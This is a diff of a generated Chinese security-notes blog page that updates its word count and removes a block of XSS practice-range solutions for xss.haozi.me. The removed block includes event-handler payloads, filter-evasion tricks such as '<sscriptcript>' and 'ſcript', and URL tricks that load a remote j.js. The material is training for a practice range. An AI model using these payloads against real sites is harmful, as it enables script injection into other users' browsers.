@@ -454,14 +454,14 @@ bash -i //容">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    33.6k
+                    33.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    141 分
+                    140 分
                 </div>
                 
 
@@ -3383,45 +3383,7 @@ ctrl<span class="token operator">+</span>c或者httpd<span class="token punctuat
 <p>使用Cookie Editor浏览器插件修改cookie，实现登录(也可以使用burp抓包修改)</p>
 <h3 id="XSS靶场训练"><a href="#XSS靶场训练" class="headerlink" title="XSS靶场训练"></a>XSS靶场训练</h3><p>靶场链接：</p>
 <p><a target="_blank" rel="noopener" href="https://xss.haozi.me/">https://xss.haozi.me</a></p>
-<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>clickme<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
-0x03
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
-0x04
-	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>parent.alert<span class="token entity" title="&#40;">&amp;#40;</span>1<span class="token entity" title="&#41;">&amp;#41;</span>&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
-	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
-0x05
-    --!><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
-0x06
-    type=image src onerror
-	=alert(1)
-0x07
-    &lt;svg onload=alert(1) /
-    &lt;svg onload=alert(1) 
-0x08
-	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
-0x09
-    https://www.segmentfault.com"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>
-<span class="token number">0x0a</span>
-    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js
-    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com@xss<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js
-<span class="token number">0x0b</span>
-    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://www.segmentfault.com.haozi.me/j.js"</span><span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
-0x0c
-	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sscriptcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sscriptcript</span><span class="token punctuation">></span></span>
-0x0d
-	asasdad
-	alert(1)
-	-->
-0x0e
-	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ſcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
-0x0f
-	'),alert(1)//
-0x10
-	alert(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
